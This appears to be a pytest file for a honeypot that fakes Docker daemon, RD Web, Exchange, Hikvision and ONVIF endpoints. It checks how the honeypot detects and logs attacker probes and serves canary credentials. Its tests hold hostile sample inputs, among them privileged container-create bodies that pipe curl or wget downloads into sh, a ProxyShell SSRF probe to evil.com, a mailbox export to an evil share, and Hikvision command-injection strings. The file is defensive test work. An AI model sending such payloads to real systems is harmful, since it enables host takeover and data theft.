    # Short (12-char) container ID — Docker CLI default form.
    assert tbenv.is_docker_daemon_path("/containers/abcdef012345/start")


def test_docker_daemon_exec_stage_paths():
    exid = "b" * 64
    for stage in ("start", "resize", "json"):
        assert tbenv.is_docker_daemon_path(f"/exec/{exid}/{stage}")


def test_docker_daemon_path_non_match():
    for path in (
        "/",
        "/.env",
        "/api/version",            # not the Docker shape
        "/api/v2/version",
        "/v2/_catalog",            # registry, separate trap
        "/v1.41/.env",
        "/containers/json.bak",
        "/exec/start",             # missing exec ID
        "/v1.41",                  # bare version prefix
        "/containers/",            # bare prefix
    ):
        assert not tbenv.is_docker_daemon_path(path), f"unexpected match: {path}"


def test_docker_daemon_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "DOCKER_DAEMON_ENABLED", False)
    assert not tbenv.is_docker_daemon_path("/containers/json")
    assert not tbenv.is_docker_daemon_path("/version")


def test_docker_daemon_normalize_strips_prefixes():
    assert tbenv._docker_daemon_normalize("/v1.43/containers/json") == "/containers/json"
    assert tbenv._docker_daemon_normalize("/:2375/containers/json") == "/containers/json"
    assert tbenv._docker_daemon_normalize("/%3a2375/v1.41/version") == "/version"
    assert tbenv._docker_daemon_normalize("/%253a2375/v1.41/_ping") == "/_ping"
    # Query string is stripped.
    assert tbenv._docker_daemon_normalize("/images/create?fromImage=alpine&tag=latest") == "/images/create"


def test_docker_daemon_parse_container_create_flags_host_takeover():
    body = json.dumps({
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "curl http://x/y.sh | sh"],
        "HostConfig": {
            "Privileged": True,
            "Binds": ["/:/mnt/host"],
            "PidMode": "host",
            "NetworkMode": "host",
            "CapAdd": ["SYS_ADMIN"],
        },
    })
    flags = tbenv._docker_daemon_parse_container_create(body)
    assert flags["dockerDaemonImage"] == "alpine:latest"
    assert "curl" in flags["dockerDaemonCmd"]
    assert flags["dockerDaemonHasPrivileged"] is True
    assert flags["dockerDaemonHasHostMount"] is True
    assert flags["dockerDaemonHasHostPid"] is True
    assert flags["dockerDaemonHasHostNetwork"] is True
    assert flags["dockerDaemonHasDangerousCap"] is True
    assert flags["dockerDaemonHasShellPayload"] is True


def test_docker_daemon_parse_container_create_substring_fallback():
    # Trailing-comma body fails strict json.loads — substring fallback
    # should still surface the host-takeover flags.
    body = (
        '{"Image":"ubuntu","HostConfig":{"Privileged":true,'
        '"Binds":["/:/host"],},}'
    )
    flags = tbenv._docker_daemon_parse_container_create(body)
    assert flags.get("dockerDaemonHasPrivileged") is True
    assert flags.get("dockerDaemonHasHostMount") is True


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_version(flux_client):
    resp = await flux_client.get(
        "/version",
        headers={"X-Forwarded-For": "203.0.113.210"},
    )
    assert resp.status == 200
    assert resp.headers.get("Api-Version") == tbenv.DOCKER_DAEMON_API_VERSION
    assert resp.headers.get("Server", "").startswith("Docker/")
    body = await resp.json()
    assert body["ApiVersion"] == tbenv.DOCKER_DAEMON_API_VERSION
    assert body["Version"] == tbenv.DOCKER_DAEMON_ENGINE_VERSION
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-version"]
    assert entries[-1]["dockerDaemonEndpoint"] == "/version"


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_info(flux_client):
    resp = await flux_client.get(
        "/info",
        headers={"X-Forwarded-For": "203.0.113.211"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["Driver"] == "overlay2"
    assert body["ServerVersion"] == tbenv.DOCKER_DAEMON_ENGINE_VERSION


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_ping(flux_client):
    resp = await flux_client.get(
        "/_ping",
        headers={"X-Forwarded-For": "203.0.113.212"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert body == b"OK"


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_containers_list(flux_client):
    resp = await flux_client.get(
        "/containers/json",
        headers={"X-Forwarded-For": "203.0.113.213"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body == []


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_ssrf_prefix_logged(flux_client):
    # Double-URL-encoded `:2375` SSRF shape — flag should fire and the
    # endpoint should resolve as if it were the bare /containers/json.
    resp = await flux_client.get(
        "/%253a2375/containers/json",
        headers={"X-Forwarded-For": "203.0.113.214"},
    )
    assert resp.status == 200
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-containers-list"]
    assert entries[-1]["dockerDaemonHasSsrfPrefix"] is True
    assert entries[-1]["dockerDaemonEndpoint"] == "/containers/json"


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_api_version_prefix_logged(flux_client):
    resp = await flux_client.get(
        "/v1.41/version",
        headers={"X-Forwarded-For": "203.0.113.215"},
    )
    assert resp.status == 200
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-version"]
    assert entries[-1]["dockerDaemonApiVersionPrefix"] == "v1.41"


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_container_create_returns_id_and_flags_payload(flux_client):
    body = json.dumps({
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "wget http://x/y.sh -O- | sh"],
        "HostConfig": {
            "Privileged": True,
            "Binds": ["/:/mnt"],
            "PidMode": "host",
        },
    }).encode("utf-8")
    resp = await flux_client.post(
        "/containers/create",
        headers={"X-Forwarded-For": "203.0.113.216", "Content-Type": "application/json"},
        data=body,
    )
    assert resp.status == 201
    payload = await resp.json()
    assert payload["Id"]  # container ID was issued
    cid = payload["Id"]
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-container-create"]
    assert entries[-1]["dockerDaemonHasPrivileged"] is True
    assert entries[-1]["dockerDaemonHasHostMount"] is True
    assert entries[-1]["dockerDaemonHasHostPid"] is True
    assert entries[-1]["dockerDaemonHasShellPayload"] is True
    assert entries[-1]["dockerDaemonImage"] == "alpine:latest"
    assert entries[-1]["dockerDaemonIssuedContainerId"] == cid
    assert entries[-1]["dockerDaemonBodySha256"]


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_container_start_returns_204(flux_client):
    cid = "f" * 64
    resp = await flux_client.post(
        f"/containers/{cid}/start",
        headers={"X-Forwarded-For": "203.0.113.217"},
    )
    assert resp.status == 204
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-container-start"]
    assert entries[-1]["dockerDaemonTargetContainerId"] == cid
    assert entries[-1]["dockerDaemonStage"] == "start"


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_exec_create_then_start(flux_client):
    cid = "0" * 64
    body = json.dumps({"Cmd": ["/bin/sh", "-c", "id"], "AttachStdout": True}).encode("utf-8")
    resp = await flux_client.post(
        f"/containers/{cid}/exec",
        headers={"X-Forwarded-For": "203.0.113.218", "Content-Type": "application/json"},
        data=body,
    )
    assert resp.status == 201
    payload = await resp.json()
    exid = payload["Id"]
    assert exid
    resp2 = await flux_client.post(
        f"/exec/{exid}/start",
        headers={"X-Forwarded-For": "203.0.113.218", "Content-Type": "application/json"},
        data=b'{"Detach":false,"Tty":false}',
    )
    assert resp2.status == 200
    entries_exec_create = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-exec-create"]
    assert entries_exec_create[-1]["dockerDaemonTargetContainerId"] == cid
    assert entries_exec_create[-1]["dockerDaemonIssuedExecId"] == exid
    entries_exec_start = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-exec-start"]
    assert entries_exec_start[-1]["dockerDaemonTargetExecId"] == exid


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_auth_header_logged(flux_client):
    # `X-Registry-Auth` is the Docker-specific header; the bare
    # Authorization fallback also gets captured.
    resp = await flux_client.post(
        "/images/create?fromImage=alpine&tag=latest",
        headers={
            "X-Forwarded-For": "203.0.113.219",
            "X-Registry-Auth": "eyJ1c2VybmFtZSI6InRlc3QifQ==",
        },
        data=b"",
    )
    assert resp.status == 200
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-daemon-image-pull"]
    assert entries[-1]["dockerDaemonAuthHeader"].startswith("eyJ1c2VybmFtZSI")


@pytest.mark.asyncio
async def test_dispatch_docker_daemon_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "DOCKER_DAEMON_ENABLED", False)
    resp = await flux_client.get(
        "/containers/json",
        headers={"X-Forwarded-For": "203.0.113.220"},
    )
    assert resp.status == 404


# --- Microsoft RDWeb (RD Web Access) trap ---


def test_rdweb_enabled_by_default():
    assert tbenv.RDWEB_ENABLED


def test_rdweb_default_paths_match_observed_probes():
    for path in (
        "/RDWeb",
        "/RDWeb/",
        "/RDWeb/Pages/",
        "/RDWeb/Pages/en-US/login.aspx",
        "/RDWeb/Pages/en-US/Default.aspx",
    ):
        assert tbenv.is_rdweb_path(path), f"expected match: {path}"


def test_rdweb_path_non_match():
    for path in (
        "/",
        "/rdweb-foo",
        "/RDWeb/Pages/foo.aspx",  # not in our default set
        "/.env",
        "/remote/login",
    ):
        assert not tbenv.is_rdweb_path(path), f"unexpected match: {path}"


def test_rdweb_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "RDWEB_ENABLED", False)
    assert not tbenv.is_rdweb_path("/RDWeb/Pages/en-US/login.aspx")


def test_render_rdweb_login_html_shape():
    body = tbenv.render_rdweb_login_html("rdweb.example", "10.0.17763").decode("utf-8")
    assert "RD Web Access" in body
    assert "/RDWeb/Pages/en-US/login.aspx" in body
    assert "DomainUserName" in body
    assert "UserPass" in body
    assert "10.0.17763" in body


def test_render_rdweb_login_html_viewstate_per_request_unique():
    a = tbenv.render_rdweb_login_html("h", "10.0.17763").decode("utf-8")
    b = tbenv.render_rdweb_login_html("h", "10.0.17763").decode("utf-8")
    assert a != b, "VIEWSTATE must be per-request unique — never a fixed literal"


def test_extract_rdweb_form_camel_case():
    body = b"DomainUserName=DOMAIN%5Cadmin&UserPass=h%26unter2&MachineType=private"
    username, has_password = tbenv.extract_rdweb_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "DOMAIN\\admin"
    assert has_password is True


def test_extract_rdweb_form_lowercase_fallback():
    body = b"domainusername=admin&userpass=p"
    username, has_password = tbenv.extract_rdweb_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "admin"
    assert has_password is True


async def test_dispatch_rdweb_login_landing(flux_client):
    resp = await flux_client.get(
        "/RDWeb/Pages/en-US/login.aspx",
        headers={"X-Forwarded-For": "203.0.113.170", "Host": "rdweb.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "RD Web Access" in text
    assert resp.headers.get("Server") == "Microsoft-IIS/10.0"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "rdweb-login"
    assert entry["rdwebPath"] == "/RDWeb/Pages/en-US/login.aspx"


async def test_dispatch_rdweb_login_post_logs_username_and_sets_session_cookie(flux_client):
    resp = await flux_client.post(
        "/RDWeb/Pages/en-US/login.aspx",
        data="DomainUserName=DOMAIN%5Cadmin&UserPass=hunter2&MachineType=private",
        headers={
            "X-Forwarded-For": "203.0.113.171",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "TSWAAuthHttpOnlyCookie=" in set_cookie

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "rdweb-login-post"
    assert entry["rdwebUsername"] == "DOMAIN\\admin"
    assert entry["rdwebHasPassword"] is True
    assert "UserPass" not in entry  # secret value never logged


@pytest.mark.parametrize(
    "post_path",
    [
        "/RDWeb",
        "/RDWeb/",
        "/RDWeb/Pages/",
    ],
)
async def test_dispatch_rdweb_login_post_on_short_landing_paths(flux_client, post_path):
    # Scanners observed in the wild POST credentials to the short landing
    # paths (`/RDWeb`, `/RDWeb/`, `/RDWeb/Pages/`), not just the full
    # `/RDWeb/Pages/en-US/login.aspx` URL. All four should be treated as
    # credential POSTs: parse the form, mint a session cookie, log result.
    resp = await flux_client.post(
        post_path,
        data="DomainUserName=DOMAIN%5Cadmin&UserPass=hunter2",
        headers={
            "X-Forwarded-For": "203.0.113.172",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "TSWAAuthHttpOnlyCookie=" in set_cookie

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "rdweb-login-post"
    assert entry["rdwebPath"] == post_path
    assert entry["rdwebUsername"] == "DOMAIN\\admin"
    assert entry["rdwebHasPassword"] is True


async def test_dispatch_rdweb_login_post_cookie_per_request_unique(flux_client):
    cookies = []
    for i in range(2):
        resp = await flux_client.post(
            "/RDWeb/Pages/en-US/login.aspx",
            data=f"DomainUserName=u{i}&UserPass=p",
            headers={
                "X-Forwarded-For": f"203.0.113.{180 + i}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        assert resp.status == 200
        cookies.append(resp.headers.get("Set-Cookie", ""))
    assert cookies[0] != cookies[1]
    assert "TSWAAuthHttpOnlyCookie=" in cookies[0]
    assert "TSWAAuthHttpOnlyCookie=" in cookies[1]


async def test_dispatch_rdweb_default_without_api_key_returns_empty_resource_list(
    flux_client, monkeypatch,
):
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/RDWeb/Pages/en-US/Default.aspx",
        headers={"X-Forwarded-For": "203.0.113.190"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "No resources" in text
    assert "aws_access_key_id" not in text
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "rdweb-default"
    assert "canaryTypes" not in entry


async def test_dispatch_rdweb_default_with_canary_embeds_aws_keys(
    flux_client, monkeypatch,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/RDWeb/Pages/en-US/Default.aspx",
        headers={"X-Forwarded-For": "203.0.113.190"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "AKIAFAKEEXAMPLE01" in text
    assert "wJalrXUtnFEMI" in text
    assert "Cloud Console" in text
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "rdweb-default"
    assert "aws" in entry["canaryTypes"]


async def test_dispatch_rdweb_post_with_canary_embeds_aws_keys_and_sets_cookie(
    flux_client, monkeypatch,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.post(
        "/RDWeb/Pages/en-US/login.aspx",
        data="DomainUserName=DOMAIN%5Cadmin&UserPass=hunter2",
        headers={
            "X-Forwarded-For": "203.0.113.193",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "AKIAFAKEEXAMPLE01" in text
    assert "TSWAAuthHttpOnlyCookie=" in resp.headers.get("Set-Cookie", "")
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "rdweb-login-post"
    assert entry["rdwebUsername"] == "DOMAIN\\admin"
    assert "aws" in entry["canaryTypes"]


def test_render_rdweb_default_html_no_canary_omits_credentials():
    body = tbenv.render_rdweb_default_html("rdweb.example").decode("utf-8")
    assert "No resources" in body
    assert "aws_access_key_id" not in body
    assert "Cloud Console" not in body


def test_render_rdweb_default_html_with_canary_embeds_per_hit_unique_keys():
    a = tbenv.render_rdweb_default_html("rdweb.example", FAKE_TRACEBIT).decode("utf-8")
    assert "AKIAFAKEEXAMPLE01" in a
    assert "Cloud Console" in a
    assert "RDPFileContents" in a
    assert "wJalrXUtnFEMI" in a


async def test_dispatch_rdweb_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "RDWEB_ENABLED", False)
    resp = await flux_client.get(
        "/RDWeb/Pages/en-US/login.aspx",
        headers={"X-Forwarded-For": "203.0.113.191"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Exchange (OWA / ECP / autodiscover / PSRemoting / ProxyShell) ------

def test_exchange_enabled_by_default():
    assert tbenv.EXCHANGE_ENABLED


@pytest.mark.parametrize(
    "path",
    [
        "/owa/auth/logon.aspx",
        "/OWA/auth/logon.aspx",
        "/owa/",
        "/owa",
        "/owa/auth/x.js",
        "/owa/auth/errorFE.aspx",
        "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
        "/ecp/",
        "/autodiscover/autodiscover.json",
        "/autodiscover/autodiscover.xml",
        "/powershell/",
        "/mapi/emsmdb",
        "/oab/",
        "/ews/exchange.asmx",
    ],
)
def test_exchange_path_match(path):
    assert tbenv.is_exchange_path(path), f"expected exchange match: {path}"


@pytest.mark.parametrize(
    "path",
    [
        "/",
        "/owafoo",                    # prefix must include trailing slash
        "/exchange-foo",
        "/aspnet_client/system_web/", # webshell-drop dir, handled elsewhere
        "/.env",
    ],
)
def test_exchange_path_non_match(path):
    assert not tbenv.is_exchange_path(path), f"unexpected exchange match: {path}"


def test_exchange_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "EXCHANGE_ENABLED", False)
    assert not tbenv.is_exchange_path("/owa/auth/logon.aspx")
    assert not tbenv.is_exchange_path("/autodiscover/autodiscover.json")


def test_render_exchange_owa_login_html_shape():
    body = tbenv.render_exchange_owa_login_html(
        "owa.example", "15.02.1118.026",
    ).decode("utf-8")
    assert "Outlook" in body
    # Real OWA posts back to /owa/auth.owa
    assert "/owa/auth.owa" in body
    assert 'name="username"' in body
    assert 'name="password"' in body
    # The build string is stamped in the footer for fingerprinting
    assert "15.02.1118.026" in body


def test_render_exchange_owa_login_html_canary_per_request_unique():
    a = tbenv.render_exchange_owa_login_html("h", "15.02.1118.026").decode("utf-8")
    b = tbenv.render_exchange_owa_login_html("h", "15.02.1118.026").decode("utf-8")
    assert a != b, "OWA canary must be per-request unique — never a fixed literal"


def test_render_exchange_autodiscover_json_embeds_per_request_bearer():
    a = tbenv.render_exchange_autodiscover_json(
        "ex.example", "victim@example.com", "tok_a_a_a",
    ).decode("utf-8")
    b = tbenv.render_exchange_autodiscover_json(
        "ex.example", "victim@example.com", "tok_b_b_b",
    ).decode("utf-8")
    assert "tok_a_a_a" in a
    assert "tok_b_b_b" in b
    assert a != b
    # Each response carries a fresh MailboxGuid too
    import json as _json
    da = _json.loads(a)
    db = _json.loads(b)
    assert da["MailboxGuid"] != db["MailboxGuid"]


def test_render_exchange_exporttool_application_xml_shape():
    body = tbenv.render_exchange_exporttool_application(
        "ex.example", "15.02.1118.026",
    ).decode("utf-8")
    assert body.startswith("<?xml")
    assert "microsoft.exchange.ediscovery.exporttool.application" in body
    assert 'version="15.02.1118.026"' in body
    assert "ex.example" in body


def test_extract_exchange_form_owa_username():
    body = b"username=DOMAIN%5Cadmin&password=hunter2&flags=4"
    username, has_password = tbenv.extract_exchange_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "DOMAIN\\admin"
    assert has_password is True


def test_extract_exchange_form_alt_field_names():
    body = b"j_username=admin&j_password=p"
    username, has_password = tbenv.extract_exchange_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "admin"
    assert has_password is True


def test_exchange_has_ps_cmdlet_matches_proxyshell_payloads():
    assert tbenv._exchange_has_ps_cmdlet(
        "$session = new-mailboxexportrequest -mailbox admin"
    )
    assert tbenv._exchange_has_ps_cmdlet(
        "Import-Module ActiveDirectory; Get-Mailbox"
    )
    assert not tbenv._exchange_has_ps_cmdlet("hello world")


async def test_dispatch_exchange_owa_login(flux_client):
    resp = await flux_client.get(
        "/owa/auth/logon.aspx",
        headers={"X-Forwarded-For": "203.0.113.200", "Host": "owa.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Outlook" in text
    assert resp.headers.get("Server") == "Microsoft-IIS/10.0"
    assert resp.headers.get("X-OWA-Version") == "15.02.1118.026"
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "cadata=" in set_cookie

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "exchange-owa-login"
    assert entry["exchangePath"] == "/owa/auth/logon.aspx"


async def test_dispatch_exchange_owa_credential_post_logs_username(flux_client):
    resp = await flux_client.post(
        "/owa/auth/logon.aspx",
        data="username=DOMAIN%5Cadmin&password=hunter2&flags=4",
        headers={
            "X-Forwarded-For": "203.0.113.201",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "exchange-owa-credential-post"
    assert entry["exchangeUsername"] == "DOMAIN\\admin"
    assert entry["exchangeHasPassword"] is True
    # password value is never lifted into a dedicated logged field
    # (bodyPreview still mirrors the raw POST for triage, same as
    # every other credential trap).
    assert "exchangePassword" not in entry
    assert "password" not in entry


async def test_dispatch_exchange_owa_session_cookie_per_request_unique(flux_client):
    cookies = []
    for i in range(2):
        resp = await flux_client.get(
            "/owa/auth/logon.aspx",
            headers={"X-Forwarded-For": f"203.0.113.{210 + i}"},
        )
        assert resp.status == 200
        cookies.append(resp.headers.get("Set-Cookie", ""))
    assert cookies[0] != cookies[1]
    assert "cadata=" in cookies[0] and "cadata=" in cookies[1]


async def test_dispatch_exchange_autodiscover_proxyshell_ssrf(flux_client):
    # The literal CVE-2021-34473 SSRF probe shape: `?@<spoof>&Email=…`
    resp = await flux_client.get(
        "/autodiscover/autodiscover.json?@evil.com/Powershell&Email=admin@autodiscover.example",
        headers={"X-Forwarded-For": "203.0.113.220", "Host": "ex.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Bearer " in text
    assert "MailboxGuid" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "exchange-autodiscover-proxyshell-ssrf"
    assert entry["exchangeAutodiscoverSpoofTarget"] == "evil.com/Powershell"
    assert entry["exchangeAutodiscoverEmail"] == "admin@autodiscover.example"


async def test_dispatch_exchange_autodiscover_bearer_per_request_unique(flux_client):
    bodies = []
    for i in range(2):
        resp = await flux_client.get(
            f"/autodiscover/autodiscover.json?@target{i}.com&Email=u{i}@x.com",
            headers={"X-Forwarded-For": f"203.0.113.{230 + i}"},
        )
        assert resp.status == 200
        bodies.append(await resp.text())
    assert bodies[0] != bodies[1]
    # both contain a Bearer literal but the literal itself is per-hit unique
    assert "Bearer " in bodies[0] and "Bearer " in bodies[1]


async def test_dispatch_exchange_exporttool_clickonce_manifest(flux_client):
    resp = await flux_client.get(
        "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
        headers={"X-Forwarded-For": "203.0.113.240", "Host": "ex.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert text.startswith("<?xml")
    assert "15.02.1118.026" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "exchange-exporttool-manifest"


async def test_dispatch_exchange_owa_landing_and_error_and_bootstrap(flux_client):
    # /owa/ -> 200 landing
    resp = await flux_client.get(
        "/owa/", headers={"X-Forwarded-For": "203.0.113.250"},
    )
    assert resp.status == 200
    assert _log_entries(flux_client.log_path)[-1]["result"] == "exchange-owa-landing"

    # /owa/auth/x.js -> 200 with build version in the body
    resp = await flux_client.get(
        "/owa/auth/x.js", headers={"X-Forwarded-For": "203.0.113.251"},
    )
    assert resp.status == 200
    assert "owa-build=15.02.1118.026" in await resp.text()
    assert _log_entries(flux_client.log_path)[-1]["result"] == "exchange-owa-bootstrap-js"

    # /owa/auth/errorFE.aspx?httpCode=500 -> 200 error page; code in log
    resp = await flux_client.get(
        "/owa/auth/errorFE.aspx?httpCode=500",
        headers={"X-Forwarded-For": "203.0.113.252"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "exchange-owa-error"
    assert entry["exchangeOwaErrorHttpCode"] == "500"


async def test_dispatch_exchange_powershell_401(flux_client):
    resp = await flux_client.get(
        "/powershell/", headers={"X-Forwarded-For": "203.0.113.253"},
    )
    assert resp.status == 401
    assert "Negotiate" in resp.headers.get("WWW-Authenticate", "")
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "exchange-powershell-pre-auth"


async def test_dispatch_exchange_powershell_cmdlet_attempt_flagged(flux_client):
    resp = await flux_client.post(
        "/powershell/",
        data="$session = New-MailboxExportRequest -Mailbox admin -FilePath \\\\evil\\share\\out.pst",
        headers={
            "X-Forwarded-For": "203.0.113.254",
            "Content-Type": "application/soap+xml",
            "X-Rps-CAT": "AAEAAAD" + "A" * 200,  # plausible Kerberos ticket length
        },
    )
    assert resp.status == 401
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "exchange-powershell-cmdlet-attempt"
    assert entry["exchangeXRpsCatPresent"] is True
    assert entry["exchangeHasPowershellCmdlet"] is True


async def test_dispatch_exchange_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "EXCHANGE_ENABLED", False)
    resp = await flux_client.get(
        "/owa/auth/logon.aspx",
        headers={"X-Forwarded-For": "203.0.113.255"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Hikvision IP-camera ISAPI trap (CVE-2021-36260 bait) ---


def test_hikvision_enabled_by_default():
    assert tbenv.HIKVISION_ENABLED


def test_hikvision_default_paths_match_observed_probes():
    for path in (
        "/SDK/webLanguage",
        "/sdk/weblanguage",
        "/ISAPI/Security/userCheck",
        "/ISAPI/System/deviceInfo",
    ):
        assert tbenv.is_hikvision_path(path), f"expected match: {path}"


def test_hikvision_path_non_match():
    for path in (
        "/",
        "/sdk",
        "/SDK/",
        "/isapi/",
        "/ISAPI/Streaming/channels",  # not in our default set
        "/.env",
    ):
        assert not tbenv.is_hikvision_path(path), f"unexpected match: {path}"


def test_hikvision_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "HIKVISION_ENABLED", False)
    assert not tbenv.is_hikvision_path("/SDK/webLanguage")


def test_hikvision_has_cmdi_indicators():
    # CVE-2021-36260 ships the command in the language XML element.
    assert tbenv._hikvision_has_cmdi("", "<language>$(id)</language>")
    assert tbenv._hikvision_has_cmdi("", "<language>`whoami`</language>")
    assert tbenv._hikvision_has_cmdi("", "<language>en;wget http://x/y</language>")
    assert tbenv._hikvision_has_cmdi("", "<language>en && curl http://x</language>")
    # Plain GET banner-grab is not flagged.
    assert not tbenv._hikvision_has_cmdi("", "")
    assert not tbenv._hikvision_has_cmdi("", "en")


async def test_dispatch_hikvision_sdk_weblanguage(flux_client):
    resp = await flux_client.get(
        "/SDK/webLanguage",
        headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<Language" in text
    assert resp.headers.get("Server") == "App-webs/"
    assert resp.headers.get("Content-Type", "").startswith("application/xml")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hikvision-sdk-weblanguage"
    assert entry["hikvisionPath"] == "/SDK/webLanguage"
    assert entry["hikvisionMethod"] == "GET"
    assert entry["hikvisionHasCmdInjection"] is False


async def test_dispatch_hikvision_isapi_deviceinfo_advertises_firmware(flux_client):
    resp = await flux_client.get(
        "/ISAPI/System/deviceInfo",
        headers={"X-Forwarded-For": "203.0.113.92"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<DeviceInfo" in text
    assert tbenv.HIKVISION_FIRMWARE_VERSION in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hikvision-isapi-deviceinfo"


async def test_dispatch_hikvision_flags_cmd_injection_in_body(flux_client):
    # CVE-2021-36260 PUT body shape — language parameter command injection.
    body = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<Language><language>$(wget http://attacker/x)</language></Language>'
    )
    resp = await flux_client.post(
        "/SDK/webLanguage",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.93",
            "Content-Type": "application/xml",
        },
    )
    assert resp.status == 200

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hikvision-sdk-weblanguage"
    assert entry["hikvisionMethod"] == "POST"
    assert entry["hikvisionHasCmdInjection"] is True
    assert "bodyPreview" in entry


async def test_dispatch_hikvision_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "HIKVISION_ENABLED", False)
    resp = await flux_client.get(
        "/SDK/webLanguage",
        headers={"X-Forwarded-For": "203.0.113.94"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- ONVIF device_service trap (Dahua-class IP-camera bait) ---


def test_onvif_enabled_by_default():
    assert tbenv.ONVIF_ENABLED


def test_onvif_default_paths_match_observed_probes():
    for path in (
        "/onvif/device_service",
        "/onvif/services",
        "/onvif/device",
        "/device_service",
        # Case-insensitive — scanners mix capitalisation.
        "/ONVIF/Device_Service",
        "/Onvif/Device",
    ):
        assert tbenv.is_onvif_path(path), f"expected match: {path}"


def test_onvif_path_non_match():
    for path in (
        "/",
        "/onvif",
        "/onvif/",
        "/services",
        "/onvif/snapshot",
        "/.env",
    ):
        assert not tbenv.is_onvif_path(path), f"unexpected match: {path}"


def test_onvif_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "ONVIF_ENABLED", False)
    assert not tbenv.is_onvif_path("/onvif/device_service")


def test_onvif_soap_action_from_body_recognises_known_actions():
    for action in ("GetDeviceInformation", "GetSystemDateAndTime",
                   "GetCapabilities", "GetUsers", "FirmwareUpgrade"):
        body = f'<s:Body><tds:{action}/></s:Body>'
        assert tbenv._onvif_soap_action_from_body(body) == action
    assert tbenv._onvif_soap_action_from_body("") == ""
